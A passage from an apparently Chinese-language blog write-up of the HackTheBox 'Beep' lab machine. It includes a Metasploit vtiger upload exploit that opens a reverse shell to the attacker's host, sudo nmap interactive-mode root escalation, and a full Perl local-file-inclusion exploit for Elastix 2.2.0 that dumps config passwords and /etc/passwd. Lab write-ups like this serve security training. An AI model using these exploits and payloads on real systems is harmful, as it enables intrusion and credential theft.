+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Beep [4:37:19] C:127</span><br><span class="line">$ sslscan 10.10.10.7</span><br><span class="line">Version: 2.0.0-static</span><br><span class="line">OpenSSL 1.1.1f-dev  xx XXX xxxx</span><br><span class="line"></span><br><span class="line">Connected to 10.10.10.7</span><br><span class="line">Testing SSL server 10.10.10.7 on port 443 using SNI name 10.10.10.7                   </span><br><span class="line"></span><br><span class="line">  SSL&#x2F;TLS Protocols:</span><br><span class="line">SSLv2     disabled</span><br><span class="line">SSLv3     enabled</span><br><span class="line">TLSv1.0   enabled</span><br><span class="line">TLSv1.1   disabled </span><br><span class="line">TLSv1.2   disabled</span><br><span class="line">TLSv1.3   disabled                                                                   </span><br><span class="line"></span><br><span class="line">  TLS Fallback SCSV:</span><br><span class="line">Server does not support TLS Fallback SCSV</span><br><span class="line"></span><br><span class="line">  TLS renegotiation:</span><br><span class="line">Secure session renegotiation supported</span><br><span class="line"></span><br><span class="line">  TLS Compression:</span><br><span class="line">Compression enabled (CRIME)</span><br><span class="line"></span><br><span class="line">  Heartbleed:</span><br><span class="line">TLSv1.0 not vulnerable to heartbleed</span><br><span class="line"></span><br><span class="line">  Supported Server Cipher(s):</span><br><span class="line">Preferred TLSv1.0  256 bits  DHE-RSA-AES256-SHA            DHE 1024 bits</span><br><span class="line">Accepted  TLSv1.0  128 bits  DHE-RSA-AES128-SHA            DHE 1024 bits</span><br><span class="line">Accepted  TLSv1.0  112 bits  DHE-RSA-DES-CBC3-SHA          DHE 1024 bits</span><br><span class="line">Accepted  TLSv1.0  256 bits  AES256-SHA                    </span><br><span class="line">Accepted  TLSv1.0  128 bits  AES128-SHA                    </span><br><span class="line">Accepted  TLSv1.0  128 bits  RC4-SHA</span><br><span class="line"></span><br><span class="line">Accepted  TLSv1.0  112 bits  DES-CBC3-SHA                 </span><br><span class="line">Accepted  TLSv1.0  56 bits   TLS_RSA_WITH_DES_CBC_SHA     </span><br><span class="line">Accepted  TLSv1.0  56 bits   TLS_DHE_RSA_WITH_DES_CBC_SHA </span><br><span class="line"></span><br><span class="line">  Server Signature Algorithm(s):</span><br><span class="line">TLSv1.0  Server accepts all signature algorithms.</span><br><span class="line"></span><br><span class="line">  SSL Certificate:</span><br><span class="line">Signature Algorithm: sha1WithRSAEncryption</span><br><span class="line">RSA Key Strength:    1024</span><br><span class="line"></span><br><span class="line">Subject:  localhost.localdomain</span><br><span class="line">Issuer:   localhost.localdomain</span><br><span class="line"></span><br><span class="line">Not valid before: Apr  7 08:22:08 2017 GMT</span><br><span class="line">Not valid after:  Apr  7 08:22:08 2018 GMT</span><br></pre></td></tr></table></figure>
+<p>wfuzz扫描目录</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407231110.png" alt=""></p>
+<h3 id="Getting-User-Access">Getting User Access</h3>
+<p>寻找vtigercrm v5.1.0的漏洞</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407225540.png" alt=""></p>
+<p>尝试``vtiger_php_exec<code>不行再换</code>vtiger_soap_upload`，可以反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_php_exec) &gt; use exploit&#x2F;multi&#x2F;http&#x2F;vtiger_soap_upload</span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit&#x2F;multi&#x2F;http&#x2F;vtiger_soap_upload):</span><br><span class="line"></span><br><span class="line">   Name       Current Setting  Required  Description </span><br><span class="line">   ----       ---------------  --------  ----------- </span><br><span class="line">   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                      yes       The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&lt;path&gt;&#39;</span><br><span class="line">   RPORT      80               yes       The target port (TCP)</span><br><span class="line">   SSL        false            no        Negotiate SSL&#x2F;TLS for outgoing connections</span><br><span class="line">   TARGETURI  &#x2F;vtigercrm&#x2F;      yes       Base vTiger CRM directory path</span><br><span class="line">   VHOST                       no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   vTigerCRM v5.4.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set RHOSTS 10.10.10.7</span><br><span class="line">RHOSTS &#x3D;&gt; 10.10.10.7</span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set RPORT 443</span><br><span class="line">RPORT &#x3D;&gt; 443</span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set SSL true</span><br><span class="line">SSL &#x3D;&gt; true</span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; set LHOST 10.10.14.5</span><br><span class="line">LHOST &#x3D;&gt; 10.10.14.5</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; check</span><br><span class="line">[+] 10.10.10.7:443 - The target is vulnerable.</span><br><span class="line">msf5 exploit(multi&#x2F;http&#x2F;vtiger_soap_upload) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.5:4444 </span><br><span class="line">[*] Uploading payload...</span><br><span class="line">[+] Upload successfully uploaded</span><br><span class="line">[*] Executing payload...</span><br><span class="line">[*] Sending stage (38288 bytes) to 10.10.10.7</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.5:4444 -&gt; 10.10.10.7:43989) at 2020-04-07 10:50:50 -0400</span><br><span class="line">[!] This exploit may require manual cleanup of &#39;bPRojImibS.php&#39; on the target</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line">[+] Deleted bPRojImibS.php</span><br><span class="line">shell</span><br><span class="line">Process 8916 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">id</span><br><span class="line">uid&#x3D;100(asterisk) gid&#x3D;101(asterisk) groups&#x3D;101(asterisk)</span><br></pre></td></tr></table></figure>
+<p>获取user flag</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;sh&#39;)&quot;   </span><br><span class="line">sh-3.2$ id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;100(asterisk) gid&#x3D;101(asterisk) groups&#x3D;101(asterisk)</span><br><span class="line">sh-3.2$ pwd</span><br><span class="line">pwd</span><br><span class="line">&#x2F;var&#x2F;www&#x2F;html&#x2F;vtigercrm</span><br><span class="line">sh-3.2$ cd &#x2F;home&#x2F;fanis</span><br><span class="line">cd &#x2F;home&#x2F;fanis</span><br><span class="line">sh-3.2$ ls -la</span><br><span class="line">ls -la</span><br><span class="line">total 32</span><br><span class="line">drwxrwxr-x 2 fanis fanis 4096 Apr  7  2017 .</span><br><span class="line">drwxr-xr-x 4 root  root  4096 Apr  7  2017 ..</span><br><span class="line">-rw------- 1 fanis fanis  114 Apr  7  2017 .bash_history</span><br><span class="line">-rw-r--r-- 1 fanis fanis   33 Apr  7  2017 .bash_logout</span><br><span class="line">-rw-r--r-- 1 fanis fanis  176 Apr  7  2017 .bash_profile</span><br><span class="line">-rw-r--r-- 1 fanis fanis  124 Apr  7  2017 .bashrc</span><br><span class="line">-rw-rw-r-- 1 fanis fanis   33 Apr  7  2017 user.txt</span><br><span class="line">sh-3.2$ cat user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">aeff3def0c765c2677b94715cffa73ac</span><br></pre></td></tr></table></figure>
+<h3 id="Getting-Root-Access">Getting Root Access</h3>
+<p>提权</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sh-3.2$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for asterisk on this host:</span><br><span class="line">    env_reset, env_keep&#x3D;&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR</span><br><span class="line">    LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE</span><br><span class="line">    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC</span><br><span class="line">    LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET</span><br><span class="line">    XAUTHORITY&quot;</span><br><span class="line"></span><br><span class="line">User asterisk may run the following commands on this host:</span><br><span class="line">    (root) NOPASSWD: &#x2F;sbin&#x2F;shutdown</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;nmap</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;yum</span><br><span class="line">    (root) NOPASSWD: &#x2F;bin&#x2F;touch</span><br><span class="line">    (root) NOPASSWD: &#x2F;bin&#x2F;chmod</span><br><span class="line">    (root) NOPASSWD: &#x2F;bin&#x2F;chown</span><br><span class="line">    (root) NOPASSWD: &#x2F;sbin&#x2F;service</span><br><span class="line">    (root) NOPASSWD: &#x2F;sbin&#x2F;init</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;postmap</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;postfix</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;saslpasswd2</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;hardware_detector</span><br><span class="line">    (root) NOPASSWD: &#x2F;sbin&#x2F;chkconfig</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;sbin&#x2F;elastix-helper</span><br></pre></td></tr></table></figure>
+<p>命中<strong>Nmap</strong>，以root权限执行且无需认证</p>
+<blockquote>
+<p>较早版本的Nmap（2.02至5.21）具有交互模式，该模式允许用户执行Shell命令由于Nmap在以root特权执行的二进制文件列表中，因此可以使用交互式控制台来以相同的特权运行shell</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sh-3.2$ sudo nmap --interactive</span><br><span class="line">sudo nmap --interactive</span><br><span class="line"></span><br><span class="line">Starting Nmap V. 4.11 ( http:&#x2F;&#x2F;www.insecure.org&#x2F;nmap&#x2F; )</span><br><span class="line">Welcome to Interactive Mode -- press h &lt;enter&gt; for help</span><br><span class="line">nmap&gt; !sh</span><br><span class="line">!sh</span><br><span class="line">sh-3.2# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">sh-3.2# cat &#x2F;root&#x2F;root.txt</span><br><span class="line">cat &#x2F;root&#x2F;root.txt</span><br><span class="line">d88e006123842106982acce0aaf453f0</span><br></pre></td></tr></table></figure>
+<h3 id="Another-Way">Another Way</h3>
+<p>重点关注几个常见服务 22(ssh)、80(apache)、443(https)、3306(mysql)、10000(httpd)，访问 <code>https://10.10.10.7:443</code> ，返回登录页面：</p>
+<img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407194104.png" style="zoom:67%;" />
+<p>使用默认登录密码：<code>username: admin password: palosanto</code>，登录错误。</p>
+<p>searchsploit找一下相关漏洞：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200407195210.png" alt=""></p>
+<p>尝试本地包含漏洞，因为靶机上的SSL证书过期了，所以要修改一下利用脚本：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/336575/can-i-force-lwpuseragent-to-accept-an-expired-ssl-certificate">https://stackoverflow.com/questions/336575/can-i-force-lwpuseragent-to-accept-an-expired-ssl-certificate</a></p>
+</blockquote>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/perl -w</span></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------#Elastix is an Open Source Sofware to establish Unified Communications.               #About this concept, Elastix goal is to incorporate all the communication alternatives,                                                                         #available at an enterprise level, into a unique solution.                           #------------------------------------------------------------------------------------############################################################                         # Exploit Title: Elastix 2.2.0 LFI                                                   # Google Dork: :(                                                                     # Author: cheki                                                                       # Version:Elastix 2.2.0</span></span><br><span class="line"><span class="comment"># Tested on: multiple</span></span><br><span class="line"><span class="comment"># CVE : notyet</span></span><br><span class="line"><span class="comment"># romanc-_-eyes ;) </span></span><br><span class="line"><span class="comment"># Discovered by romanc-_-eyes</span></span><br><span class="line"><span class="comment"># vendor http://www.elastix.org/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\t Elastix 2.2.0 LFI Exploit \n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\t code author cheki   \n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\t 0day Elastix 2.2.0  \n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\t email: anonymous17hacker&#123;&#125;gmail.com \n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> LWP::UserAgent;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n Target: https://ip &quot;</span>;</span><br><span class="line"><span class="keyword">chomp</span>(<span class="keyword">my</span> $target=&lt;STDIN&gt;);</span><br><span class="line">$dir=<span class="string">&quot;vtigercrm&quot;</span>;</span><br><span class="line">$poc=<span class="string">&quot;current_language&quot;</span>;</span><br><span class="line">$etc=<span class="string">&quot;etc&quot;</span>;</span><br><span class="line">$jump=<span class="string">&quot;../../../../../../../..//&quot;</span>;</span><br><span class="line">$test=<span class="string">&quot;amportal.conf%00&quot;</span>;</span><br><span class="line">$code = LWP::UserAgent-&gt;new() <span class="keyword">or</span> <span class="keyword">die</span> <span class="string">&quot;inicializacia brauzeris\n&quot;</span>;</span><br><span class="line">$code-&gt;ssl_opts(<span class="string">verify_hostname =&gt;</span> <span class="number">0</span>, <span class="string">SSL_verify_mode =&gt;</span> <span class="number">0x00</span>);</span><br><span class="line">$code-&gt;agent(<span class="string">&#x27;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)&#x27;</span>);</span><br><span class="line">$host = $target . <span class="string">&quot;/&quot;</span>.$dir.<span class="string">&quot;/graph.php?&quot;</span>.$poc.<span class="string">&quot;=&quot;</span>.$jump.<span class="string">&quot;&quot;</span>.$etc.<span class="string">&quot;/&quot;</span>.$test.<span class="string">&quot;&amp;module=Accounts&amp;action&quot;</span>;</span><br><span class="line">$res = $code-&gt;request(HTTP::Request-&gt;new(<span class="string">GET=&gt;</span>$host));</span><br><span class="line">$answer = $res-&gt;content; <span class="keyword">if</span> ($answer =~ <span class="string">&#x27;This file is part of FreePBX&#x27;</span>) &#123;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n read amportal.conf file : $answer \n\n&quot;</span>;</span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot; successful read\n&quot;</span>;</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123; </span><br><span class="line"><span class="keyword">print</span> <span class="string">&quot;\n[-] not successful\n&quot;</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
+<p>从之前 sslscan 的扫描结果我们看到靶机只支持 TLSv1.0，因此我们需要修改 Kali 的openssl配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[system_default_sect]</span><br><span class="line">#MinProtocol &#x3D; TLSv1.2</span><br><span class="line">#CipherString &#x3D; DEFAULT@SECLEVEL&#x3D;2</span><br><span class="line"></span><br><span class="line">MinProtocol &#x3D; TLSv1.0</span><br><span class="line">CipherString &#x3D; DEFAUT</span><br></pre></td></tr></table></figure>
+<p>再执行利用脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Beep [5:15:57]</span><br><span class="line">$ perl 37637.pl &gt; elastix</span><br><span class="line"># kali @ kali in ~&#x2F;HackTheBox&#x2F;Beep [5:16:34]</span><br><span class="line">$ cat elastix</span><br><span class="line">...</span><br><span class="line">AMPDBHOST&#x3D;localhost</span><br><span class="line">AMPDBENGINE&#x3D;mysql</span><br><span class="line"># AMPDBNAME&#x3D;asterisk</span><br><span class="line">AMPDBUSER&#x3D;asteriskuser</span><br><span class="line"># AMPDBPASS&#x3D;amp109</span><br><span class="line">AMPDBPASS&#x3D;jEhdIekWmdjE</span><br><span class="line">AMPENGINE&#x3D;asterisk</span><br><span class="line">AMPMGRUSER&#x3D;admin</span><br><span class="line">#AMPMGRPASS&#x3D;amp111</span><br><span class="line">AMPMGRPASS&#x3D;jEhdIekWmdjE</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>利用payload直接在网页上查看<code>/etc/passwd</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin</span><br><span class="line">adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin</span><br><span class="line">lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin</span><br><span class="line">sync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync</span><br><span class="line">shutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown</span><br><span class="line">halt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt</span><br><span class="line">mail:x:8:12:mail:&#x2F;var&#x2F;spool&#x2F;mail:&#x2F;sbin&#x2F;nologin</span><br><span class="line">news:x:9:13:news:&#x2F;etc&#x2F;news:</span><br><span class="line">uucp:x:10:14:uucp:&#x2F;var&#x2F;spool&#x2F;uucp:&#x2F;sbin&#x2F;nologin</span><br><span class="line">operator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologin</span><br><span class="line">games:x:12:100:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologin</span><br><span class="line">gopher:x:13:30:gopher:&#x2F;var&#x2F;gopher:&#x2F;sbin&#x2F;nologin</span><br><span class="line">ftp:x:14:50:FTP User:&#x2F;var&#x2F;ftp:&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:99:99:Nobody:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">mysql:x:27:27:MySQL Server:&#x2F;var&#x2F;lib&#x2F;mysql:&#x2F;bin&#x2F;bash</span><br><span class="line">distcache:x:94:94:Distcache:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">vcsa:x:69:69:virtual console memory owner:&#x2F;dev:&#x2F;sbin&#x2F;nologin</span><br><span class="line">pcap:x:77:77::&#x2F;var&#x2F;arpwatch:&#x2F;sbin&#x2F;nologin</span><br><span class="line">ntp:x:38:38::&#x2F;etc&#x2F;ntp:&#x2F;sbin&#x2F;nologin</span><br><span class="line">cyrus:x:76:12:Cyrus IMAP Server:&#x2F;var&#x2F;lib&#x2F;imap:&#x2F;bin&#x2F;bash</span><br><span class="line">dbus:x:81:81:System message bus:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">apache:x:48:48:Apache:&#x2F;var&#x2F;www:&#x2F;sbin&#x2F;nologin</span><br><span class="line">mailman:x:41:41:GNU Mailing List Manager:&#x2F;usr&#x2F;lib&#x2F;mailman:&#x2F;sbin&#x2F;nologin</span><br><span class="line">rpc:x:32:32:Portmapper RPC user:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">postfix:x:89:89::&#x2F;var&#x2F;spool&#x2F;postfix:&#x2F;sbin&#x2F;nologin</span><br><span class="line">asterisk:x:100:101:Asterisk VoIP PBX:&#x2F;var&#x2F;lib&#x2F;asterisk:&#x2F;bin&#x2F;bash</span><br><span class="line">rpcuser:x:29:29:RPC Service User:&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;sbin&#x2F;nologin</span><br><span class="line">nfsnobody:x:65534:65534:Anonymous NFS User:&#x2F;var&#x2F;lib&#x2F;nfs:&#x2F;sbin&#x2F;nologin</span><br><span class="line">sshd:x:74:74:Privilege-separated SSH:&#x2F;var&#x2F;empty&#x2F;sshd:&#x2F;sbin&#x2F;nologin</span><br><span class="line">spamfilter:x:500:500::&#x2F;home&#x2F;spamfilter:&#x2F;bin&#x2F;bash</span><br><span class="line">haldaemon:x:68:68:HAL daemon:&#x2F;:&#x2F;sbin&#x2F;nologin</span><br><span class="line">xfs:x:43:43:X Font Server:&#x2F;etc&#x2F;X11&#x2F;fs:&#x2F;sbin&#x2F;nologin</span><br><span class="line">fanis:x:501:501::&#x2F;home&#x2F;fanis:&#x2F;bin&#x2F;bash</span><br><span class="line">Sorry! Attempt to access restricted file.</span><br></pre></td></tr></table></figure>
+<p>使用<code>fanis : jEhdIekWmdjE</code>登录靶机发现密码错误，再一看Writeup，直接是可以root登录…orz==</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> kali @ kali <span class="keyword">in</span> ~/HackTheBox/Beep [9:19:31] </span></span><br><span class="line"><span class="meta">$</span><span class="bash"> ssh root@10.10.10.7</span></span><br><span class="line">root@10.10.10.7&#x27;s password: </span><br><span class="line">Last login: Tue Apr  7 16:20:42 2020 from 10.10.14.5</span><br><span class="line"></span><br><span class="line">Welcome to Elastix </span><br><span class="line">----------------------------------------------------</span><br><span class="line"></span><br><span class="line">To access your Elastix System, using a separate workstation (PC/MAC/Linux)</span><br><span class="line">Open the Internet Browser using the following URL:</span><br><span class="line">http://10.10.10.7</span><br><span class="line"></span><br><span class="line">[root@beep ~]# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</span><br><span class="line">[root@beep ~]# cat /root/root.txt </span><br><span class="line">d88e006123842106982acce0aaf453f0</span><br><span class="line">[root@beep ~]# cat /home/fanis/user.txt </span><br><span class="line">aeff3def0c765c2677b94715cffa73ac</span><br></pre></td></tr></table></figure>
+
+</div>
+
+
+  <div class="book-comments">
+    
+
+
+    <div id="disqus_thread"></div>
+    <script>
+    (function() { // DON'T EDIT BELOW THIS LINE
+    var d = document, s = d.createElement('script');
+    s.src = 'https://ca01h.disqus.com/embed.js';
+    s.setAttribute('data-timestamp', +new Date());
+    (d.head || d.body).appendChild(s);
+    })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+
+  </div>
+
+
+
+<script src="/js/book-post.js"></script>
+
+        </div>
+      </div>
+      <div class="column col-2 hide-lg">
+        <div class="book-post-info">
+  
